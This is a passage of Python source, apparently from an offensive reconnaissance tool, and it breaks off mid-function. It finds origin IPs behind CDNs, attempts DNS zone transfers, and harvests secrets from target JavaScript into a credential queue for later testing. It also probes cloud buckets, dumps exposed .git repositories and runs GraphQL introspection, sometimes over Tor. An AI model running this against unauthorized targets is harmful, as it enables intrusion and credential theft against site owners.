"""Infrastructure, cloud, and miscellaneous phases."""
from reconchain.phases.helpers import *
from reconchain.phases.recon import _JS_SECRET_PATTERNS, _SOURCE_MAP_RE
from reconchain.phases.client_side import _CSP_BYPASS_CDNS


async def phase_14_ORIGIN(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"14-ORIGIN"}:
        return {}
    _j_out = outdir / "origin.txt"
    if _j_out.exists() and not force:
        return {"14-ORIGIN": str(_j_out), "count": count_nonblank(_j_out)}
    log("info", "Phase 14-ORIGIN: origin IP bypass enumeration")
    findings: List[str] = []
    _j_extra_headers = _extra_headers_dict()
    _j_urlopen = _get_urlopener()
    hosts_file = Path(prev.get("04-SCAN.targets") or outdir / "host_targets.txt")
    if not hosts_file.exists():
        hosts_file = outdir / "resolved.txt"
    have_hosts = hosts_file.exists() and bool(read_lines(hosts_file))
    # 1. Favicon hash
    favicon_urls = []
    if have_hosts:
        for h in read_lines(hosts_file)[:_PIPELINE_CFG.sample_hosts_origin]:
            base = h if h.startswith("http") else f"https://{h}"
            favicon_urls.append(base.rstrip("/") + "/favicon.ico")
    if not favicon_urls:
        favicon_urls = [f"https://{domain}/favicon.ico"]
    for url in favicon_urls:
        try:
            _j_fav_hdr = {"User-Agent": "Mozilla/5.0"}
            _j_fav_hdr.update(_j_extra_headers)
            req = urllib.request.Request(url, headers=_j_fav_hdr, method="GET")
            _, _, data = await _async_urlopen(_j_urlopen, req, timeout=10)
            if data:
                h = _mmh3_hash(data) & 0xFFFFFFFF
                findings.append(f"favicon_hash={h} (url={url})")
                findings.append(
                    f"  Shodan: https://www.shodan.io/search?query=http.favicon.hash:{h}"
                )
                findings.append(
                    f"  Shodan (org): https://www.shodan.io/search?query=org:%22Cloudflare%22+http.favicon.hash:{h}"
                )
                break
        except Exception:
            continue
    # 2. crt.sh certificate history
    crt_urls = [
        f"https://crt.sh/?q={domain}&output=json",
        f"https://crt.sh/?q=%25.{domain}&output=json",
    ]
    crt_found_any = False
    for crt_url in crt_urls:
        if crt_found_any:
            break
        try:
            _j_crt_hdr = {"User-Agent": "Mozilla/5.0"}
            _j_crt_hdr.update(_j_extra_headers)
            req = urllib.request.Request(crt_url, headers=_j_crt_hdr)
            _, _, crt_raw = await _async_urlopen(_j_urlopen, req, timeout=15)
            raw = crt_raw.decode("utf-8", errors="ignore")
            certs = json.loads(raw)
            if not isinstance(certs, list) or not certs:
                continue
            ips: Set[str] = set()
            subdomains: Set[str] = set()
            for c in certs if isinstance(certs, list) else []:
                if isinstance(c, dict):
                    nv = c.get("name_value", "")
                    for name in nv.split("\n"):
                        name = name.strip().lower()
                        if name and _is_valid_hostname(name):
                            subdomains.add(name)
            # Try to resolve a few subdomains to find non-CF IPs
            resolved = [s for s in subdomains if s != domain][:_PIPELINE_CFG.sample_hosts_origin]
            if t.has("dnsx") and resolved:
                crt_subs = outdir / "crt_subs.txt"
                ensure(crt_subs).write_text("\n".join(resolved) + "\n")
                crt_resolved = outdir / "crt_resolved.txt"
                await _run(
                    "dnsx-crt",
                    [
                        "dnsx",
                        "-silent",
                        "-l",
                        str(crt_subs),
                        "-o",
                        str(crt_resolved),
                        "-a",
                        "-resp",
                    ],
                    300,
                    outdir,
                )
                if crt_resolved.exists():
                    for ln in read_lines(crt_resolved):
                        parts = ln.split()
                        if len(parts) >= 3:
                            ip = parts[-1].strip("[]")
                            if ip and ip.count(".") == 3:
                                ips.add(ip)
            if ips:
                findings.append(f"crt.sh: {len(subdomains)} subdomains, {len(ips)} unique IPs")
                for ip in list(ips)[:10]:
                    findings.append(f"  origin_candidate={ip}")
            crt_found_any = True
        except Exception:
            continue
    # 3. MX records (often not proxied by Cloudflare)
    # Use public DNS resolver to avoid local stub resolver issues over proxychains
    mx_file = outdir / "mx_records.txt"
    _DNS_RESOLVER = "@8.8.8.8"
    _raw_dns_resolver = os.environ.get("DNS_RESOLVER", "")
    if _raw_dns_resolver and re.match(r'^@[A-Za-z0-9.\-:\[\]]+$', _raw_dns_resolver):
        _DNS_RESOLVER = _raw_dns_resolver
    if t.has("dig"):
        rc, mx_stdout, _ = await _run_cmd_clear_proxy(
            ["dig", "+short", _DNS_RESOLVER, "mx", domain], timeout=15,
        )
        mx = mx_stdout.decode("utf-8", errors="ignore").strip() if rc == 0 else ""
        if mx and not mx.startswith(";"):
            ensure(mx_file).write_text(mx + "\n")
            for ln in mx.splitlines():
                ln = ln.strip()
                if ln:
                    findings.append(f"mx_record={ln}")
                    # Try resolving the MX target
                    mx_host = (ln.split()[-1] if len(ln.split()) > 1 else ln).rstrip(".")
                    if t.has("dig"):
                        try:
                            rc2, out2, _ = await _run_cmd_clear_proxy(
                                ["dig", "+short", _DNS_RESOLVER, mx_host.rstrip(".")], timeout=10,
                            )
                            for mip in (out2.decode().splitlines() if rc2 == 0 else []):
                                mip = mip.strip()
                                if mip and mip.count(".") == 3:
                                    findings.append(f"  mx_ip={mip} (non-CF origin candidate)")
                        except Exception:
                            pass
    # 3b. DNS zone transfer attempt (AXFR) — low success rate but high impact
    if t.has("dig"):
        try:
            rc_ns, ns_stdout, _ = await _run_cmd_clear_proxy(
                ["dig", "+short", _DNS_RESOLVER, "ns", domain], timeout=10,
            )
            for ns_line in (ns_stdout.decode(errors="ignore").splitlines() if rc_ns == 0 else []):
                ns = ns_line.strip().rstrip(".")
                if not ns or not _is_valid_hostname(ns):
                    continue
                try:
                    rc_axfr, axfr_out, _ = await _run_cmd_clear_proxy(
                        ["dig", "axfr", f"@{ns}", domain], timeout=15,
                    )
                    axfr_text = axfr_out.decode(errors="ignore") if rc_axfr >= 0 else ""
                    # dig axfr returns exit code 0 even on failure; check for
                    # actual zone data (SOA record) vs "Transfer failed"
                    _axfr_has_data = (
                        "SOA" in axfr_text
                        and "Transfer failed" not in axfr_text
                    )
                    if _axfr_has_data:
                        findings.append(f"  axfr_success=YES (ns={ns}) — zone data follows")
                        for axfr_ln in axfr_text.splitlines()[:20]:
                            findings.append(f"    {axfr_ln[:120]}")
                except Exception:
                    continue
        except Exception:
            pass
    # 3c. SPF / DMARC / DKIM DNS record checks (all use TXT records)
    if t.has("dig"):
        for rec, label in (("txt", "SPF"), ("txt", "DMARC"), ("txt", "DKIM")):
            query = f"_dmarc.{domain}" if label == "DMARC" else (
                f"default._domainkey.{domain}" if label == "DKIM" else domain)
            try:
                rc_sp, sp_out, _ = await _run_cmd_clear_proxy(
                    ["dig", "+short", _DNS_RESOLVER, "txt", query], timeout=10,
                )
                sp_text = sp_out.decode(errors="ignore") if rc_sp >= 0 else ""
                if sp_text.strip():
                    findings.append(f"  {label}_records:")
                    for sp_ln in sp_text.splitlines()[:5]:
                        findings.append(f"    {sp_ln[:200]}")
                    if "v=spf1" in sp_text.lower() and "~all" in sp_text.lower():
                        findings.append(f"    → {label}: softfail (~all) — may be spoofable")
                    elif "v=spf1" in sp_text.lower() and "?all" in sp_text.lower():
                        findings.append(f"    → {label}: neutral (?all) — no enforcement")
                    elif "v=spf1" in sp_text.lower() and "-all" not in sp_text.lower():
                        findings.append(f"    → {label}: no hardfail — consider -all")
            except Exception:
                continue
    # 4. Check resolved IPs against Cloudflare ASN (with local caching)
    resolved_path = Path(prev.get("02-RESOLVE") or outdir / "resolved_full.txt")
    ipcache = outdir / ".ipinfo_cache.json"
    ipcache_data: Dict[str, dict] = {}
    if ipcache.exists():
        try:
            ipcache_data = json.loads(ipcache.read_text(encoding="utf-8", errors="ignore"))
        except (json.JSONDecodeError, ValueError):
            ipcache_data = {}
    if resolved_path.exists():
        resolved_ips: Set[str] = set()
        for ln in read_lines(resolved_path):
            parts = ln.split()
            if len(parts) >= 3 and parts[-2].strip("[]") == "A":
                # Only A-record lines: host [A] [1.2.3.4]
                ip = parts[-1].strip("[]")
                if ip and ip.count(".") == 3:
                    resolved_ips.add(ip)
        if resolved_ips:
            cf_ips: Set[str] = set()
            non_cf_ips: Set[str] = set()
            for ip in sorted(resolved_ips)[:_PIPELINE_CFG.sample_hosts_origin]:
                if ip in ipcache_data:
                    info_data = ipcache_data[ip]
                else:
                    try:
                        _j_ip_hdr = {"User-Agent": "Mozilla/5.0"}
                        _j_ip_hdr.update(_j_extra_headers)
                        req = urllib.request.Request(
                            f"https://ipinfo.io/{ip}/json", headers=_j_ip_hdr
                        )
                        _, _, ip_info_bytes = await _async_urlopen(_j_urlopen, req, timeout=10)
                        info = ip_info_bytes.decode("utf-8", errors="ignore")
                        info_data = json.loads(info)
                        ipcache_data[ip] = info_data
                    except Exception:
                        findings.append(
                            f"  unresolved_ip={ip} (check manually)"
                        )
                        continue
                org = (info_data.get("org") or "").lower()
                if "cloudflare" in org or "13335" in org:
                    cf_ips.add(ip)
                else:
                    non_cf_ips.add(ip)
                    findings.append(
                        f"  non_cloudflare_ip={ip}  org={info_data.get('org', 'unknown')}"
                    )
            if ipcache_data:
                ipcache.write_text(json.dumps(ipcache_data, indent=2))
            if cf_ips:
                findings.append(f"  cloudflare_ips={', '.join(sorted(cf_ips))}")
            if non_cf_ips:
                findings.append(f"  non_cloudflare_candidates={', '.join(sorted(non_cf_ips))}")
    out = ensure(outdir / "origin.txt")
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"14-ORIGIN: {len(findings)} origin findings → {out}")
    return {"14-ORIGIN": str(out), "count": len(findings)}

async def phase_15_SECRETS(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False) -> Dict[str, Any]:
    if skip & {"15-SECRETS"}:
        return {}
    _k_out = outdir / "js_secrets_deep.txt"
    if _k_out.exists() and not force:
        return {"15-SECRETS": str(_k_out), "count": count_nonblank(_k_out)}
    log("info", "Phase 15-SECRETS: deep JS secret scanning (custom regex + entropy + source maps)")
    _k_extra_headers = _extra_headers_dict()
    _k_urlopen = _get_urlopener()
    js_urls = outdir / "urls_js.txt"
    if not js_urls.exists() or not read_lines(js_urls):
        await asyncio.sleep(3)
    if not js_urls.exists() or not read_lines(js_urls):
        log("info", "15-SECRETS: no JS URLs; skipping")
        return {"15-SECRETS": str(outdir / "js_secrets_deep.txt"), "count": 0}
    findings: List[str] = []
    seen_secrets: Set[str] = set()
    seen_sourcemaps: Set[str] = set()
    # unfurl URL component extraction from JS URLs (extracts paths, keys, values)
    if t.has("unfurl"):
        unfurl_out = outdir / "unfurled_urls.txt"
        runner = outdir / "logs" / "unfurl_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(js_urls))}\n"
            f"OUT={shlex.quote(str(unfurl_out))}\n"
            'cat "$IN" | unfurl paths >> "$OUT" 2>/dev/null\n'
            'cat "$IN" | unfurl keys >> "$OUT" 2>/dev/null\n'
            'cat "$IN" | unfurl values >> "$OUT"\n'
        )
        runner.chmod(0o700)
        unfurl_jobs: List[Tuple[str, List[str], int]] = []
        unfurl_jobs.append(("unfurl", ["bash", str(runner)], 300))
        await run_parallel(unfurl_jobs, outdir)
        if unfurl_out.exists() and read_lines(unfurl_out):
            deduped = set(read_lines(unfurl_out))
            unfurl_out.write_text("\n".join(sorted(deduped)) + "\n")
            merge_unique(
                [outdir / "urls_all.txt", unfurl_out],
                outdir / "urls_all.txt",
            )
    for js_url in read_lines(js_urls):
        try:
            _k_hdr = {"User-Agent": "Mozilla/5.0"}
            _k_hdr.update(_k_extra_headers)
            req = urllib.request.Request(js_url, headers=_k_hdr)
            _, _, body_bytes = await _async_urlopen(_k_urlopen, req, timeout=15)
            body = body_bytes.decode("utf-8", errors="ignore")
        except Exception:
            continue
        # Save raw JS file for gitleaks scanning
        js_raw = ensure(outdir / f"js_raw_{safe_suffix(js_url)}.js")
        js_raw.write_text(body)
        # Custom regex patterns
        for name, pattern in _JS_SECRET_PATTERNS:
            for m in re.finditer(pattern, body):
                val = m.group()
                if val not in seen_secrets:
                    seen_secrets.add(val)
                    findings.append(f"[{name}] {val}  ({js_url})")
        # Shannon-entropy scan for high-entropy strings (likely API keys /
        # secrets not caught by regex). Look for base64-ish strings of 32+ chars.
        for m in re.finditer(r"[\"']([A-Za-z0-9+/=]{40,})[\"']", body):
            val = m.group(1)
            if val in seen_secrets:
                continue
            # Shannon entropy > 4.5 suggests random-looking secret
            freq: Dict[str, int] = {}
            for c in val:
                freq[c] = freq.get(c, 0) + 1
            entropy = 0.0
            for f in freq.values():
                p = f / len(val)
                entropy -= p * math.log2(p)
            if entropy > 4.5:
                seen_secrets.add(val)
                findings.append(f"[high-entropy] {val[:60]}… (entropy={entropy:.2f})  ({js_url})")
    # Source maps
        for m in _SOURCE_MAP_RE.finditer(body):
            sm_url = m.group(1)
            if not sm_url.startswith("http"):
                base = js_url.rsplit("/", 1)[0]
                sm_url = base.rstrip("/") + "/" + sm_url.lstrip("/")
            sm_entry = f"[sourcemap] {sm_url}  ({js_url})"
            if sm_url in seen_sourcemaps:
                continue
            seen_sourcemaps.add(sm_url)
            findings.append(sm_entry)
            try:
                _k_sm_hdr = {"User-Agent": "Mozilla/5.0"}
                _k_sm_hdr.update(_k_extra_headers)
                sm_req = urllib.request.Request(sm_url, headers=_k_sm_hdr)
                _, _, sm_body_bytes = await _async_urlopen(_k_urlopen, sm_req, timeout=15)
                sm_body = sm_body_bytes.decode("utf-8", errors="ignore")
                sm_data = json.loads(sm_body)
                sources = sm_data.get("sources") or []
                for src in sources:
                    if isinstance(src, str):
                        for name2, pattern2 in _JS_SECRET_PATTERNS:
                            for m2 in re.finditer(pattern2, src):
                                val2 = m2.group()
                                if val2 not in seen_secrets:
                                    seen_secrets.add(val2)
                                    findings.append(f"  [sourcemap-{name2}] {val2}")
            except Exception:
                continue
    # gitleaks scan on downloaded JS files for secret patterns
    # trufflehog scan on downloaded JS files
    if t.has("trufflehog"):
        if list(outdir.glob("js_raw_*.js")):
            truffle_jobs: List[Tuple[str, List[str], int]] = []
            for jf in sorted(outdir.glob("js_raw_*.js")):
                truffle_out = outdir / f"trufflehog_{safe_suffix(jf.name)}.txt"
                truffle_runner = outdir / "logs" / f"trufflehog_{safe_suffix(jf.name)}.sh"
                ensure(truffle_runner)
                truffle_runner.write_text(
                    "#!/usr/bin/env bash\n"
                    "set -eu\n"
                    f"IN={shlex.quote(str(jf))}\n"
                    f"OUT={shlex.quote(str(truffle_out))}\n"
                    'trufflehog filesystem "$IN" --no-verification --no-update > "$OUT"\n'
                )
                truffle_runner.chmod(0o700)
                truffle_jobs.append((
                    f"trufflehog-{safe_suffix(jf.name)[:16]}",
                    ["bash", str(truffle_runner)],
                    300,
                ))
            if truffle_jobs:
                await run_parallel(truffle_jobs, outdir)
                for tfp in sorted(outdir.glob("trufflehog_*.txt")):
                    if tfp.exists() and read_lines(tfp):
                        for ln in read_lines(tfp):
                            findings.append(f"  [trufflehog] {ln}")
    if t.has("gitleaks"):
        if list(outdir.glob("js_raw_*.js")):
            gitleaks_jobs: List[Tuple[str, List[str], int]] = []
            for jf in sorted(outdir.glob("js_raw_*.js")):
                safe = safe_suffix(jf.name)
                gl_out = outdir / f"gitleaks_{safe}.json"
                gitleaks_jobs.append(
                    (
                        f"gitleaks-{safe[:16]}",
                        [
                            "gitleaks", "detect",
                            "--source", str(jf),
                            "--report-format", "json",
                            "--report-path", str(gl_out),
                            "--no-git",
                            "-v",
                        ],
                        300,
                    )
                )
            if gitleaks_jobs:
                await run_parallel(gitleaks_jobs, outdir)
                for glp in sorted(outdir.glob("gitleaks_*.json")):
                    try:
                        gl_data = json.loads(glp.read_text(encoding="utf-8", errors="ignore"))
                        if isinstance(gl_data, list):
                            for item in gl_data:
                                desc = item.get("description", "secret")
                                fname = item.get("file", "")
                                line = item.get("startLine", "")
                                match = item.get("match", "")[:80]
                                findings.append(
                                    f"  [gitleaks] {desc} in {fname}:{line} {match}"
                                )
                        elif isinstance(gl_data, dict) and gl_data.get("Findings"):
                            for item in gl_data["Findings"]:
                                findings.append(
                                    f"  [gitleaks] {item.get('Description','secret')} "
                                    f"in {item.get('File','')}:{item.get('StartLine','')} "
                                    f"{item.get('Match','')[:80]}"
                                )
                    except (json.JSONDecodeError, ValueError):
                        continue
    out = ensure(outdir / "js_secrets_deep.txt")
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    # Clean up raw JS and intermediate gitleaks files
    for p in outdir.glob("js_raw_*.js"):
        p.unlink(missing_ok=True)
    for p in outdir.glob("gitleaks_*.json"):
        p.unlink(missing_ok=True)
    for p in outdir.glob("trufflehog_*.txt"):
        p.unlink(missing_ok=True)
    log("ok", f"15-SECRETS: {len(findings)} deep JS findings → {out}")
    # Push found credentials into the shared credential queue for downstream phases
    cred_patterns = re.compile(r"(?i)(api[_-]?key|secret|token|password|jwt|bearer|auth)", re.IGNORECASE)
    for f in findings:
        if cred_patterns.search(f):
            _PIPELINE_CFG.credentials_queue.append(f)
    if _PIPELINE_CFG.credentials_queue:
        log("info", f"15-SECRETS: {len(_PIPELINE_CFG.credentials_queue)} potential credentials added to testing queue")
    return {"15-SECRETS": str(out), "count": len(findings)}

_CLOUD_PROVIDERS: List[Dict[str, Any]] = [
    {"name": "AWS", "domain": "s3.amazonaws.com", "fmt": "{bucket}.s3.amazonaws.com"},
    {"name": "GCP", "domain": "storage.googleapis.com", "fmt": "{bucket}.storage.googleapis.com"},
    {"name": "Azure", "domain": "blob.core.windows.net", "fmt": "{bucket}.blob.core.windows.net"},
    {"name": "DO", "domain": "digitaloceanspaces.com", "fmt": "{bucket}.digitaloceanspaces.com"},
]
_CLOUD_BUCKET_KEYWORDS = [
    "backup", "assets", "media", "uploads", "data", "files", "static",
    "cdn", "downloads", "public", "private", "prod", "dev", "staging",
    "test", "logs", "config", "deploy", "bucket", "storage", "backups",
    "archive", "images", "videos", "docs", "resources", "temp",
]

async def phase_18_CLOUD(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"18-CLOUD"}:
        return {}
    _m_out = outdir / "cloud_buckets.txt"
    if _m_out.exists() and not force:
        return {"18-CLOUD": str(_m_out), "count": count_nonblank(_m_out)}
    log("info", "Phase 18-CLOUD: cloud bucket discovery")
    findings: List[str] = []
    _m_urlopen = _get_urlopener()
    seen_buckets: Set[str] = set()
    # Build candidate bucket names from domain + common keywords
    base = domain.split(".")[0] if "." in domain else domain
    candidates: Set[str] = set()
    candidates.add(base)
    candidates.add(domain.replace(".", "-"))
    candidates.add(domain.replace(".", ""))
    for kw in _CLOUD_BUCKET_KEYWORDS:
        candidates.add(f"{base}-{kw}")
        candidates.add(f"{base}{kw}")
        candidates.add(f"{kw}-{base}")
        candidates.add(f"{domain}-{kw}")
    # Trim to configured sample size
    candidate_list = sorted(candidates)[:_PIPELINE_CFG.sample_hosts_cloud * 10]
    # If cloud_enum is available and working, use it as the primary scanner
    if t.has("cloud_enum") and t.verify("cloud_enum", ["--help"]):
        cloud_in = ensure(outdir / "cloud_enum_domains.txt")
        cloud_in.write_text(domain + "\n")
        cloud_out = outdir / "cloud_enum_raw.txt"
        await _run(
            "cloud_enum",
            ["cloud_enum", "-k", domain, "-l", str(cloud_out), "-qs"],
            600, outdir,
        )
        if cloud_out.exists():
            findings.append(f"[cloud_enum] results → {cloud_out}")
    # CloudFox cloud enumeration
    if t.has("cloudfox"):
        cloudfox_outdir = outdir / "cloudfox_results"
        cloudfox_outdir.mkdir(parents=True, exist_ok=True)
        runner = outdir / "logs" / "cloudfox_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"DOMAIN={shlex.quote(domain)}\n"
            f"OUT={shlex.quote(str(cloudfox_outdir))}\n"
            '# Try common AWS profiles; silently skip if no credentials\n'
            'for profile in default dev staging prod; do\n'
              '  cloudfox aws -p "$profile" --outdir "$OUT" all\n'
            'done\n'
        )
        runner.chmod(0o700)
        await _run("cloudfox", ["bash", str(runner)], 600, outdir)
        reports = list(cloudfox_outdir.glob("**/*.txt"))
        if reports:
            findings.append(f"[cloudfox] {len(reports)} report files → {cloudfox_outdir}")
    # Python-based bucket probing
    async def _probe_bucket(bucket: str) -> List[str]:
        results: List[str] = []
        for provider in _CLOUD_PROVIDERS:
            url = f"http://{provider['fmt'].format(bucket=bucket)}"
            key = f"{provider['name']}:{url}"
            if key in seen_buckets:
                continue
            seen_buckets.add(key)
            try:
                req = urllib.request.Request(url, method="HEAD",
                    headers={"User-Agent": "Mozilla/5.0"})
                bucket_status, _, _ = await _async_urlopen(_m_urlopen, req, timeout=10)
                if bucket_status in (200, 301, 302, 403):
                    results.append(f"[{provider['name']}] {url} (HTTP {bucket_status})")
            except Exception:
                continue
        return results

    probe_results = await asyncio.gather(*[_probe_bucket(c) for c in candidate_list])
    for pr in probe_results:
        findings.extend(pr)
    out = ensure(_m_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"Phase 18-CLOUD: {len(findings)} cloud bucket findings → {out}")
    return {"18-CLOUD": str(out), "count": len(findings)}

_GIT_PATHS = [
    "/.git/config",
    "/.git/HEAD",
    "/.gitignore",
    "/.git/",
    "/git/config",
    "/.svn/entries",
]
_GIT_COMMON_REFS = [
    "refs/heads/master",
    "refs/heads/main",
    "refs/heads/dev",
    "refs/heads/develop",
]

async def phase_19_GIT(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"19-GIT"}:
        return {}
    _n_out = outdir / "git_exposure.txt"
    if _n_out.exists() and not force:
        return {"19-GIT": str(_n_out), "count": count_nonblank(_n_out)}
    log("info", "Phase 19-GIT: git exposure scanning")
    findings: List[str] = []
    _n_urlopen = _get_urlopener()
    # Collect targets: HTTP hosts from 04-SCAN or raw resolved hosts
    targets: List[str] = []
    hosts_file = Path(prev.get("04-SCAN.targets") or outdir / "host_targets.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("04-SCAN.hosts") or outdir / "hosts.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("02-RESOLVE") or outdir / "resolved.txt")
    if hosts_file.exists():
        for h in read_lines(hosts_file)[:_PIPELINE_CFG.sample_hosts_git]:
            if not h.startswith("http"):
                h = f"https://{h}"
            targets.append(h.rstrip("/"))
    if not targets:
        log("warn", "Phase 19-GIT: no HTTP targets; skipping")
        return {"19-GIT": str(_n_out), "count": 0}
    # Check for exposed .git directories (use no-redirect to avoid false positives)
    _no_redirect_urlopen = _get_no_redirect_urlopener()
    async def _check_git(url: str) -> List[str]:
        results: List[str] = []
        for git_path in _GIT_PATHS:
            test_url = f"{url}{git_path}"
            try:
                req = urllib.request.Request(test_url, method="HEAD",
                    headers={"User-Agent": "Mozilla/5.0"})
                git_status, _, _ = await _async_urlopen(_no_redirect_urlopen, req, timeout=10)
                if git_status == 200:
                    results.append(f"[.git-exposed] {test_url} (HTTP {git_status})")
                    break
            except urllib.error.HTTPError as e:
                if e.code in (200, 301, 302):
                    results.append(f"[.git-exposed] {test_url} (HTTP {e.code})")
                    break
            except Exception:
                continue
        # If .git is exposed, try to download it
        if results and t.has("gitdumper"):
            git_base = url.rstrip("/") + "/.git/"
            dump_dir = outdir / f"git_dump_{safe_suffix(url)}"
            dump_dir.mkdir(parents=True, exist_ok=True)
            await _run(
                f"gitdumper-{_safe_name(url)}",
                ["gitdumper", git_base, str(dump_dir)],
                300, outdir,
            )
            if dump_dir.exists() and list(dump_dir.iterdir()):
                results.append(f"[git-dumped] {git_base} → {dump_dir}")
                # Run trufflehog on the dumped repo
                if t.has("trufflehog"):
                    truffle_out = outdir / f"trufflehog_{safe_suffix(url)}.txt"
                    runner = outdir / "logs" / f"trufflehog_{safe_suffix(url)}.sh"
                    ensure(runner)
                    runner.write_text(
                        "#!/usr/bin/env bash\n"
                        "set -eu\n"
                        f"DIR={shlex.quote(str(dump_dir))}\n"
                        f"OUT={shlex.quote(str(truffle_out))}\n"
                        'trufflehog filesystem "$DIR" --no-verification > "$OUT"\n'
                    )
                    runner.chmod(0o700)
                    await _run(
                        f"trufflehog-{_safe_name(url)}",
                        ["bash", str(runner)], 600, outdir,
                    )
                    if truffle_out.exists() and read_lines(truffle_out):
                        results.append(f"[trufflehog] secrets found → {truffle_out}")
        return results

    git_results = await asyncio.gather(*[_check_git(t) for t in targets])
    for gr in git_results:
        findings.extend(gr)
    out = ensure(_n_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"Phase 19-GIT: {len(findings)} git exposure findings → {out}")
    return {"19-GIT": str(out), "count": len(findings)}

_GRAPHQL_ENDPOINTS = [
    "/graphql", "/gql", "/v1/graphql", "/v2/graphql",
    "/api/graphql", "/api/gql", "/graph", "/query",
    "/graphql/", "/gql/", "/explorer", "/graphiql",
    "/v1/gql", "/v2/gql", "/admin/graphql",
]

async def _gql_precheck(url: str, timeout: int = 10) -> bool:
    """Quick probe: POST a minimal GraphQL query and check for GraphQL-like response."""
    probe_query = '{"query":"{ __typename }"}'
    try:
        req = urllib.request.Request(
            url, method="POST",
            data=probe_query.encode(),
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        )
        opener = _get_urlopener()
        status, headers, body_bytes = await _async_urlopen(opener, req, timeout=timeout)
        if status != 200:
            return False
        ct = headers.get("Content-Type", "")
        if "application/json" not in ct and "text/json" not in ct:
            return False
        body = body_bytes.decode("utf-8", errors="ignore")
        return '"data"' in body or '"errors"' in body or '__typename' in body
    except Exception:
        return False


_GRAPHQL_INTROSPECTION_QUERY = """
{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { kind name description fields { name description type { kind name ofType { kind name } } } } } }"}
"""

async def phase_20_GRAPHQL(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"20-GRAPHQL"}:
        return {}
    _o_out = outdir / "graphql_introspection.txt"
    if _o_out.exists() and not force:
        return {"20-GRAPHQL": str(_o_out), "count": count_nonblank(_o_out)}
    log("info", "Phase 20-GRAPHQL: GraphQL introspection")
    findings: List[str] = []
    _o_urlopen = _get_urlopener()
    # Collect HTTP targets
    targets: List[str] = []
    hosts_file = Path(prev.get("04-SCAN.targets") or outdir / "host_targets.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("04-SCAN.hosts") or outdir / "hosts.txt")
    if not hosts_file.exists() or not read_lines(hosts_file):
        hosts_file = Path(prev.get("02-RESOLVE") or outdir / "resolved.txt")
    if hosts_file.exists():
        for h in read_lines(hosts_file)[:_PIPELINE_CFG.sample_hosts_graphql]:
            if not h.startswith("http"):
                h = f"https://{h}"
            targets.append(h.rstrip("/"))
    # Normalize all targets to HTTPS to avoid 308 redirects
    targets = [re.sub(r"^http://", "https://", t) for t in targets]
    if not targets:
        log("warn", "Phase 20-GRAPHQL: no HTTP targets; skipping")
        return {"20-GRAPHQL": str(_o_out), "count": 0}

    # ── Smart pre-check: probe all target×endpoint combos in parallel ──
    # Only run expensive tools (inql, clairvoyance, graphinder) on endpoints
    # that actually respond with GraphQL-like content, avoiding timeouts
    # on non-existent or WAF-blocked endpoints.
    async def _alive_gql_endpoints() -> List[str]:
        alive: List[str] = []
        probe_urls = [f"{tgt}{ep}" for tgt in targets for ep in _GRAPHQL_ENDPOINTS]
        probe_tasks = []
        for url in probe_urls:
            probe_tasks.append(_gql_precheck(url))
        results = await asyncio.gather(*probe_tasks, return_exceptions=True)
        for url, ok in zip(probe_urls, results):
            if ok and not isinstance(ok, Exception):
                alive.append(url)
        return alive

    _live_gql = await _alive_gql_endpoints()
    if _live_gql:
        log("ok", f"20-GRAPHQL: {len(_live_gql)} responsive GraphQL endpoint(s) found")
        for u in _live_gql:
            findings.append(f"[alive] {u}")

    # inql integration (only on live endpoints, skip under proxychains — urllib CONNECT fails with Tor)
    if t.has("inql") and _live_gql and not _USE_PROXYCHAINS:
        inql_out = outdir / "inql_results"
        inql_out.mkdir(parents=True, exist_ok=True)
        inql_jobs: List[Tuple[str, List[str], int]] = []
        for url in _live_gql:
            runner = outdir / "logs" / f"inql_{_safe_name(url)}_runner.sh"
            ensure(runner)
            runner.write_text(
                "#!/usr/bin/env bash\n"
                "set -eu\n"
                f"URL={shlex.quote(url)}\n"
                f"OUT={shlex.quote(str(inql_out))}\n"
                'inql -t "$URL" -o "$OUT"\n'
            )
            runner.chmod(0o700)
            inql_jobs.append((f"inql-{_safe_name(url)}", ["bash", str(runner)], 300))
        if inql_jobs:
            await run_parallel(inql_jobs, outdir)

    # Clairvoyance GraphQL introspection abuse (only on live endpoints)
    if t.has("clairvoyance") and _live_gql:
        clairvoyance_out = outdir / "clairvoyance_results"
        clairvoyance_out.mkdir(parents=True, exist_ok=True)
        cv_jobs: List[Tuple[str, List[str], int]] = []
        for url in _live_gql:
            cv_out = clairvoyance_out / f"{_safe_name(url)}.json"
            runner = outdir / "logs" / f"clairvoyance_{_safe_name(url)}_runner.sh"
            ensure(runner)
            runner.write_text(
                "#!/usr/bin/env bash\n"
                "set -eu\n"
                f"URL={shlex.quote(url)}\n"
                f"OUT={shlex.quote(str(cv_out))}\n"
                'clairvoyance "$URL" -o "$OUT"\n'
            )
            runner.chmod(0o700)
            cv_jobs.append((f"clairvoyance-{_safe_name(url)}", ["bash", str(runner)], 300))
        if cv_jobs:
            await run_parallel(cv_jobs, outdir)
        cv_reports = list(clairvoyance_out.glob("*.json"))
        if cv_reports:
